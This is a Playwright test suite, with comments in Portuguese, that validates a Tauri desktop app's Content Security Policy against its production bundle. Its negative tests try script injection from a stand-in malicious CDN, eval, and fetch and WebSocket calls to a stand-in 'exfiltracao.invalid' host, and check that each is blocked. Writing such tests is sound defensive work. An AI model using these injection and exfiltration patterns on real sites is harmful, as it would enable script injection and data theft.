/**
 * Fase 22.8.2 — validação da Content Security Policy do app desktop, no BUNDLE DE PRODUÇÃO (`build:desktop`).
 *
 * Executar:  node --test --test-concurrency=1 tests/ui/csp.ui.mjs
 *   (CSP_REUSAR_BUILD=1 reaproveita um `dist/client` já gerado.)
 *
 * Emulação do runtime Tauri (sem instalar nem abrir o app desktop):
 *   - A CSP é lida de `src-tauri/tauri.conf.json` (`app.security.csp`) — a MESMA que o Tauri empacota.
 *   - Como o Tauri, ela é injetada como `<meta http-equiv="Content-Security-Policy">` no `index.html`, e o `script-src`
 *     recebe o hash SHA-256 de cada `<script>` inline do HTML gerado (modificação de CSP de assets do Tauri). O
 *     `style-src` NÃO recebe hashes: `dangerousDisableAssetCspModification: ["style-src"]` (ver tauri.conf.json).
 *   - `dist/client` é servido por um servidor local; `'self'` = essa origem (no Windows o Tauri usa
 *     `http://tauri.localhost`).
 *
 * Isolamento — NENHUMA requisição real: o host da API embutido no build (`mariela-backend.onrender.com`), o
 * `api.github.com` e os hosts de mídia são ATENDIDOS por um backend falso via `page.route` (a CSP é avaliada pelo
 * navegador ANTES da interceptação, então o que passa pela CSP é atendido localmente e o que ela bloqueia nunca sai).
 * Qualquer outra requisição externa é abortada e faz o teste falhar.
 */
import { after, before, describe, test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import fs from "node:fs";
import http from "node:http";
import path from "node:path";
import { chromium } from "playwright";

const RAIZ = process.cwd();
const DIST = path.join(RAIZ, "dist", "client");
const PORTA = Number(process.env.CSP_PORT ?? 5318);
const BASE = `http://127.0.0.1:${PORTA}`;
const API_HOST = "mariela-backend.onrender.com"; // o mesmo do `release.yml` (build oficial)
const API = `https://${API_HOST}/api/v1`;

// ─── CSP efetiva (como o Tauri a monta) ────────────────────────────────────────────────────────────────────────────

const conf = JSON.parse(fs.readFileSync(path.join(RAIZ, "src-tauri", "tauri.conf.json"), "utf8"));
const CSP_CONFIG = conf.app.security.csp;
assert.equal(typeof CSP_CONFIG, "object", "app.security.csp deveria estar configurada (não null)");

/**
 * Hashes dos `<script>` inline como o Tauri os calcula (`tauri-codegen` 2.7.4, `inject_script_hashes`): texto do
 * elemento NÃO vazio após o parse HTML (`dom_query`/html5ever) + `normalize_script_for_csp` (CRLF/CR → LF). O parser
 * HTML troca cada NUL (U+0000) dentro de `<script>` por U+FFFD — e o script de hidratação do TanStack contém NULs
 * crus (`"__root__\u0000"`). É também o texto sobre o qual o NAVEGADOR calcula o hash; usar o texto cru do arquivo
 * daria um hash diferente e o app quebraria ("Invariant failed").
 */
export function hashesDosScriptsInline(htmlIndex) {
  return [...htmlIndex.matchAll(/<script(?![^>]*\ssrc=)[^>]*>([\s\S]*?)<\/script>/g)]
    .map(([, corpo]) => corpo)
    .filter((corpo) => corpo.length > 0)
    .map((corpo) => corpo.replace(/\u0000/g, "�").replace(/\r\n?/g, "\n"))
    .map((texto) => `'sha256-${createHash("sha256").update(texto, "utf8").digest("base64")}'`);
}

function montarCsp(htmlIndex) {
  const hashes = hashesDosScriptsInline(htmlIndex);
  const desabilitadas = conf.app.security.dangerousDisableAssetCspModification ?? [];
  return Object.entries(CSP_CONFIG)
    .map(([diretiva, valor]) => {
      const fontes = [valor];
      if (diretiva === "script-src" && !desabilitadas.includes("script-src"))
        fontes.push(...hashes);
      return `${diretiva} ${fontes.join(" ")}`;
    })
    .join("; ");
}

// ─── Servidor local do bundle ──────────────────────────────────────────────────────────────────────────────────────

const TIPOS = {
  ".html": "text/html; charset=utf-8",
  ".js": "text/javascript",
  ".css": "text/css",
  ".woff2": "font/woff2",
  ".ico": "image/x-icon",
  ".svg": "image/svg+xml",
  ".png": "image/png",
  ".txt": "text/plain",
};
let servidor;
let navegador;
let cspEfetiva = "";
let htmlComCsp = "";
const PNG_1PX = Buffer.from(
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=",
  "base64",
);

before(async () => {
  if (process.env.CSP_REUSAR_BUILD !== "1") {
    // EXATAMENTE o comando do Tauri/release (`beforeBuildCommand: bun run build:desktop`). Gerar o bundle com
    // `node vite.js build` produz um bundle DIFERENTE (sem os toasts do sonner funcionando) — achado da Fase 22.8.2,
    // fora do escopo; o build oficial usa `bun run`, e o teste precisa validar o MESMO bundle que é empacotado.
    const r = spawnSync("bun", ["--no-env-file", "run", "build:desktop"], {
      cwd: RAIZ,
      env: {
        ...process.env,
        VITE_USE_MOCK_API: "false",
        VITE_API_URL: API,
      },
      encoding: "utf8",
    });
    assert.equal(
      r.status,
      0,
      `build:desktop falhou:\n${(r.stdout ?? "") + (r.stderr ?? "")}`.slice(-3000),
    );
  }
  const html = fs.readFileSync(path.join(DIST, "index.html"), "utf8");
  cspEfetiva = montarCsp(html);
  htmlComCsp = html.replace(
    /<head>/i,
    `<head><meta http-equiv="Content-Security-Policy" content="${cspEfetiva.replace(/"/g, "&quot;")}">`,
  );
  servidor = http.createServer((req, res) => {
    const url = new URL(req.url, BASE);
    const arquivo = path.join(DIST, decodeURIComponent(url.pathname));
    if (
      url.pathname !== "/" &&
      arquivo.startsWith(DIST) &&
      fs.existsSync(arquivo) &&
      fs.statSync(arquivo).isFile()
    ) {
      res.writeHead(200, {
        "content-type": TIPOS[path.extname(arquivo)] ?? "application/octet-stream",
      });
      return fs.createReadStream(arquivo).pipe(res);
    }
    // Fallback de SPA (como o Tauri serve o index para as rotas do app).
    res.writeHead(200, { "content-type": TIPOS[".html"] });
    res.end(htmlComCsp);
  });
  await new Promise((ok) => servidor.listen(PORTA, "127.0.0.1", ok));
  navegador = await chromium.launch({ channel: "chrome", headless: true });
});

after(async () => {
  await navegador?.close();
  await new Promise((ok) => (servidor ? servidor.close(ok) : ok()));
});

// ─── Backend falso + coleta de violações ───────────────────────────────────────────────────────────────────────────

const VENDA = {
  id: "venda-csp",
  codigo: "VEN-CSP1",
  numero: "1",
  dataVenda: "2026-11-10T14:00:00.000Z",
  clienteId: null,
  clienteNome: "Cliente Fictício",
  vendedorId: null,
  vendedorNome: "Vendedora Fictícia",
  caixaId: null,
  caixaCodigo: "CX-TESTE",
  totalItens: 1,
  valorBruto: 100,
  descontoPromocional: 0,
  descontoVenda: 0,
  descontoTotal: 0,
  valorFinal: 100,
  valorPago: 100,
  valorPendente: 0,
  valorDevolvido: 0,
  temPromocao: false,
  temDesconto: false,
  formaPagamento: "Pix",
  totalParcelas: 1,
  parcelasPagas: 1,
  status: "concluida",
  observacao: "",
  itens: [
    {
      id: "item-1",
      produtoId: "p1",
      codProduto: "PRD-1",
      nome: "Blusa Fictícia",
      categoria: "Teste",
      varianteId: null,
      codVariante: null,
      cor: null,
      tamanho: "M",
      // Foto num host https externo, como as de mídia (R2_PUBLIC_BASE_URL) — permitido por `img-src https:`.
      foto: "https://midia.ficticia.test/produtos/foto.png",
      quantidade: 1,
      precoOriginal: 100,
      precoPraticado: 100,
      emPromocao: false,
      descontoItem: 0,
      subtotal: 100,
      quantidadeDevolvida: 0,
    },
  ],
  pagamentos: [],
  parcelas: [],
  historico: [],
  cancelamentos: [],
};

async function novaPagina({ tema } = {}) {
  const contexto = await navegador.newContext();
  const externas = [];
  const atendidas = [];
  await contexto.route(
    (url) => url.host !== `127.0.0.1:${PORTA}`,
    async (route) => {
      const url = new URL(route.request().url());
      if (url.host === API_HOST) {
        atendidas.push(`API ${route.request().method()} ${url.pathname}`);
        if (url.pathname.endsWith("/auth/login")) {
          return route.fulfill({
            status: 401,
            contentType: "application/json",
            headers: { "access-control-allow-origin": "*" },
            body: JSON.stringify({
              statusCode: 401,
              code: "INVALID_CREDENTIALS",
              message: "Credenciais inválidas (fictício).",
            }),
          });
        }
        const corpo = url.pathname.endsWith("/auth/me")
          ? {
              data: {
                id: "u",
                codigo: "USR-1",
                nome: "Admin",
                email: "a@b.test",
                tipo: "ADMIN",
                ativo: true,
              },
            }
          : url.pathname.endsWith(`/vendas/${VENDA.id}`)
            ? { data: VENDA }
            : { data: [] };
        return route.fulfill({
          status: 200,
          contentType: "application/json",
          headers: { "access-control-allow-origin": "*", "access-control-allow-headers": "*" },
          body: JSON.stringify(corpo),
        });
      }
      if (url.host === "api.github.com" || url.host.endsWith(".r2.cloudflarestorage.com")) {
        atendidas.push(`${url.host} ${url.pathname}`);
        return route.fulfill({
          status: 200,
          contentType: "application/json",
          headers: {
            "access-control-allow-origin": "*",
            "access-control-allow-headers": "*",
            "access-control-allow-methods": "*",
          },
          body: "{}",
        });
      }
      if (url.host === "midia.ficticia.test") {
        atendidas.push(`midia ${url.pathname}`);
        return route.fulfill({ status: 200, contentType: "image/png", body: PNG_1PX });
      }
      externas.push(url.href);
      return route.abort("blockedbyclient");
    },
  );
  await contexto.addInitScript((temaInicial) => {
    window.__violacoes = [];
    window.addEventListener("securitypolicyviolation", (e) =>
      window.__violacoes.push({
        diretiva: e.effectiveDirective,
        bloqueado: e.blockedURI,
        amostra: e.sample,
      }),
    );
    window.__temaNoDOMContentLoaded = null;
    document.addEventListener("DOMContentLoaded", () => {
      window.__temaNoDOMContentLoaded = document.documentElement.classList.contains("dark")
        ? "dark"
        : "light";
    });
    if (temaInicial && !sessionStorage.getItem("__temaDefinido")) {
      localStorage.setItem("mariela-theme", temaInicial);
      sessionStorage.setItem("__temaDefinido", "1");
    }
  }, tema ?? null);
  const pagina = await contexto.newPage();
  const consoleCsp = [];
  const errosDePagina = [];
  pagina.on("console", (m) => {
    if (/Content Security Policy|Refused to/i.test(m.text()))
      consoleCsp.push(m.text().slice(0, 300));
  });
  pagina.on("pageerror", (e) => errosDePagina.push(String(e).slice(0, 300)));
  return {
    contexto,
    pagina,
    externas,
    atendidas,
    consoleCsp,
    errosDePagina,
    violacoes: () => pagina.evaluate(() => window.__violacoes),
    async encerrar() {
      await contexto.close();
      assert.deepEqual(externas, [], "requisição externa fora do backend falso");
    },
  };
}

// ─── Testes positivos ──────────────────────────────────────────────────────────────────────────────────────────────

describe("CSP — o app funciona sob a política (bundle de produção)", () => {
  test("a política efetiva tem as diretivas esperadas e nada de unsafe-eval / unsafe-inline em scripts", () => {
    assert.match(cspEfetiva, /default-src 'self'/);
    assert.match(cspEfetiva, /object-src 'none'/);
    assert.match(cspEfetiva, /base-uri 'self'/);
    assert.doesNotMatch(cspEfetiva, /unsafe-eval/);
    const scriptSrc = cspEfetiva.split("; ").find((d) => d.startsWith("script-src "));
    assert.doesNotMatch(scriptSrc, /unsafe-inline/);
    assert.match(
      scriptSrc,
      /'sha256-[A-Za-z0-9+/=]{44}'/,
      "hashes dos scripts inline do index.html",
    );
    assert.doesNotMatch(
      cspEfetiva,
      /connect-src[^;]*\*(?!\.r2\.cloudflarestorage\.com)/,
      "connect-src sem curinga amplo",
    );
  });

  test("tela de login: carrega, fontes LOCAIS aplicadas, toast de erro (sonner) funciona — zero violações", async () => {
    const s = await novaPagina();
    const requisicoesDeFonte = [];
    s.pagina.on("request", (r) => {
      if (/\.woff2(\?|$)/.test(r.url())) requisicoesDeFonte.push(r.url());
    });
    await s.pagina.goto(`${BASE}/login`);
    await s.pagina.getByText("Entrar no Backoffice").waitFor({ timeout: 30_000 });
    await s.pagina.evaluate(() => document.fonts.ready);
    const fontes = await s.pagina.evaluate(() => ({
      inter: document.fonts.check('16px "Inter"'),
      cormorant: document.fonts.check('32px "Cormorant Garamond"'),
      jost: document.fonts.check('16px "Jost"'),
      carregadas: [...document.fonts]
        .filter((f) => f.status === "loaded")
        .map((f) => f.family.replace(/"/g, "")),
    }));
    assert.ok(fontes.carregadas.includes("Inter"), `Inter não carregou: ${JSON.stringify(fontes)}`);
    assert.ok(
      fontes.carregadas.includes("Cormorant Garamond"),
      `Cormorant não carregou: ${JSON.stringify(fontes)}`,
    );
    assert.ok(
      requisicoesDeFonte.length > 0 && requisicoesDeFonte.every((u) => u.startsWith(BASE)),
      "fontes só da origem do app",
    );

    await s.pagina.getByLabel("Usuário ou e-mail").fill("admin@ficticio.test");
    await s.pagina.getByLabel("Senha").fill("senha-ficticia");
    await s.pagina.getByRole("button", { name: "Entrar" }).click();
    await s.pagina.getByText("Credenciais inválidas (fictício).").waitFor({ timeout: 15_000 });
    assert.deepEqual(await s.violacoes(), []);
    assert.deepEqual(s.consoleCsp, []);
    assert.deepEqual(s.errosDePagina, []);
    await s.encerrar();
  });

  for (const tema of ["dark", "light"]) {
    test(`tema '${tema}': aplicado antes do primeiro render (script inline autorizado por hash) e persistido`, async () => {
      const s = await novaPagina({ tema });
      await s.pagina.goto(`${BASE}/login`);
      await s.pagina.getByText("Entrar no Backoffice").waitFor({ timeout: 30_000 });
      const estado = await s.pagina.evaluate(() => ({
        classe: document.documentElement.classList.contains("dark") ? "dark" : "light",
        esquema: document.documentElement.style.colorScheme,
        noDOMContentLoaded: window.__temaNoDOMContentLoaded,
        salvo: localStorage.getItem("mariela-theme"),
      }));
      assert.deepEqual(estado, {
        classe: tema,
        esquema: tema,
        noDOMContentLoaded: tema,
        salvo: tema,
      });
      await s.pagina.reload();
      await s.pagina.getByText("Entrar no Backoffice").waitFor({ timeout: 30_000 });
      assert.equal(
        await s.pagina.evaluate(() => document.documentElement.classList.contains("dark")),
        tema === "dark",
      );
      assert.deepEqual(await s.violacoes(), []);
      await s.encerrar();
    });
  }

  test("área autenticada: página da venda com foto https, diálogo de cancelamento — zero violações", async () => {
    const s = await novaPagina();
    await s.pagina.goto(`${BASE}/login`);
    await s.pagina.evaluate(() => localStorage.setItem("mariela.accessToken", "token-ficticio"));
    await s.pagina.goto(`${BASE}/vendas/${VENDA.id}`);
    try {
      await s.pagina.getByText("Itens da venda").waitFor({ timeout: 30_000 });
    } catch (erro) {
      // Diagnóstico de intermitência: estado da página no momento da falha.
      const estado = await s.pagina.evaluate(() => ({
        url: location.pathname,
        texto: document.body.innerText.replace(/\s+/g, " ").slice(0, 300),
        violacoes: window.__violacoes,
      }));
      throw new Error(
        `${erro.message}\nestado: ${JSON.stringify(estado)}\natendidas: ${JSON.stringify(s.atendidas)}\nerros: ${JSON.stringify(s.errosDePagina)}`,
      );
    }
    const foto = s.pagina.locator('img[src^="https://midia.ficticia.test/"]');
    await foto.waitFor();
    assert.ok(
      await foto.evaluate((img) => img.complete && img.naturalWidth > 0),
      "foto https não carregou",
    );
    await s.pagina.getByRole("button", { name: "Cancelar / devolver" }).click();
    await s.pagina.getByRole("dialog").waitFor();
    assert.ok(
      s.atendidas.some((a) => a.startsWith("API GET") && a.endsWith(`/vendas/${VENDA.id}`)),
      "API atendida pelo falso",
    );
    assert.deepEqual(await s.violacoes(), []);
    assert.deepEqual(s.consoleCsp, []);
    assert.deepEqual(s.errosDePagina, []);
    await s.encerrar();
  });

  test("connect-src permite exatamente API (https), GitHub Releases e upload R2", async () => {
    const s = await novaPagina();
    await s.pagina.goto(`${BASE}/login`);
    await s.pagina.getByText("Entrar no Backoffice").waitFor({ timeout: 30_000 });
    const resultados = await s.pagina.evaluate(
      async (urls) => {
        const r = {};
        for (const u of urls)
          r[u] = await fetch(u, {
            method: u.includes("r2") ? "PUT" : "GET",
            body: u.includes("r2") ? "x" : undefined,
          }).then(
            (x) => x.status,
            (e) => String(e),
          );
        return r;
      },
      [
        `https://${API_HOST}/api/v1/health-ficticio`,
        "https://api.github.com/repos/x/y/releases/latest",
        "https://conta.r2.cloudflarestorage.com/bucket/obj?X-Amz-Signature=ficticia",
      ],
    );
    for (const [url, status] of Object.entries(resultados))
      assert.equal(status, 200, `${url} → ${status}`);
    assert.deepEqual(await s.violacoes(), []);
    await s.encerrar();
  });
});

// ─── Testes negativos ──────────────────────────────────────────────────────────────────────────────────────────────

describe("CSP — bloqueios (testes negativos controlados, sem rede)", () => {
  /** Executa `acao` na página do app e devolve as violações novas + o resultado da ação. */
  async function tentar(s, acao, arg) {
    const antes = (await s.violacoes()).length;
    const resultado = await s.pagina.evaluate(acao, arg);
    await s.pagina.waitForTimeout(400);
    return { violacoes: (await s.violacoes()).slice(antes), resultado };
  }

  const casos = [
    [
      "script de origem não autorizada",
      "script-src-elem",
      () => {
        const el = document.createElement("script");
        el.src = "https://cdn.malicioso.invalid/x.js";
        document.head.appendChild(el);
      },
    ],
    [
      "script inline injetado (sem hash)",
      "script-src-elem",
      () => {
        const el = document.createElement("script");
        el.textContent = "window.__injetado = true";
        document.head.appendChild(el);
        return window.__injetado === true;
      },
    ],
    // O `eval` roda num `setTimeout` (tarefa normal da página): código avaliado DIRETAMENTE pelo `page.evaluate` passa
    // pelo protocolo DevTools, que o Chrome isenta da checagem de `unsafe-eval` — o teste não provaria nada.
    [
      "eval / unsafe-eval",
      "script-src",
      () => {
        setTimeout(() => {
          try {
            window.__evalResultado = eval("1+1");
          } catch (e) {
            window.__evalResultado = String(e).slice(0, 60);
          }
        }, 0);
      },
    ],
    [
      "fetch para domínio não autorizado",
      "connect-src",
      () =>
        fetch("https://exfiltracao.invalid/").then(
          () => "ok",
          (e) => String(e).slice(0, 40),
        ),
    ],
    [
      "fetch HTTP (não-TLS) ao host da API",
      "connect-src",
      () =>
        fetch("http://mariela-backend.onrender.com/api/v1/x").then(
          () => "ok",
          (e) => String(e).slice(0, 40),
        ),
    ],
    [
      "WebSocket para domínio não autorizado",
      "connect-src",
      () => {
        try {
          new WebSocket("wss://exfiltracao.invalid/");
        } catch (e) {
          return String(e).slice(0, 40);
        }
      },
    ],
    [
      "<object> incorporado",
      "object-src",
      () => {
        const el = document.createElement("object");
        el.data = "https://objeto.invalid/x.swf";
        document.body.appendChild(el);
      },
    ],
    [
      "<iframe> externo",
      "frame-src",
      () => {
        const el = document.createElement("iframe");
        el.src = "https://quadro.invalid/";
        document.body.appendChild(el);
      },
    ],
    [
      "fonte externa (Google Fonts)",
      "font-src",
      () =>
        new FontFace("X", "url(https://fonts.gstatic.com/s/inter/v1/x.woff2)").load().then(
          () => "ok",
          (e) => String(e).slice(0, 40),
        ),
    ],
    [
      "folha de estilo externa (Google Fonts)",
      "style-src-elem",
      () => {
        const el = document.createElement("link");
        el.rel = "stylesheet";
        el.href = "https://fonts.googleapis.com/css2?family=Inter";
        document.head.appendChild(el);
      },
    ],
    [
      "imagem por HTTP não-TLS",
      "img-src",
      () => {
        const el = new Image();
        el.src = "http://imagem.invalid/x.png";
        document.body.appendChild(el);
      },
    ],
    [
      "<base href> externo",
      "base-uri",
      () => {
        const el = document.createElement("base");
        el.href = "https://base.invalid/";
        document.head.appendChild(el);
      },
    ],
    [
      "envio de formulário para outro domínio",
      "form-action",
      () => {
        const f = document.createElement("form");
        f.action = "https://formulario.invalid/";
        f.method = "post";
        f.target = "_self";
        document.body.appendChild(f);
        f.requestSubmit();
      },
    ],
  ];

  for (const [nome, diretiva, acao] of casos) {
    test(`bloqueia: ${nome} (${diretiva})`, async () => {
      const s = await novaPagina();
      await s.pagina.goto(`${BASE}/login`);
      await s.pagina.getByText("Entrar no Backoffice").waitFor({ timeout: 30_000 });
      const { violacoes, resultado } = await tentar(s, acao);
      assert.ok(
        violacoes.some((v) => v.diretiva === diretiva),
        `esperava violação de ${diretiva}; vieram ${JSON.stringify(violacoes)} (resultado: ${JSON.stringify(resultado)})`,
      );
      if (nome.startsWith("script inline"))
        assert.equal(resultado, false, "o script inline injetado executou");
      if (nome.startsWith("eval")) {
        const evalResultado = await s.pagina.evaluate(() => window.__evalResultado);
        assert.notEqual(evalResultado, 2, "eval executou");
        assert.match(
          String(evalResultado),
          /EvalError/,
          `eval deveria lançar EvalError, veio ${evalResultado}`,
        );
      }
      await s.encerrar(); // inclui: nenhuma requisição saiu para a rede
    });
  }
});
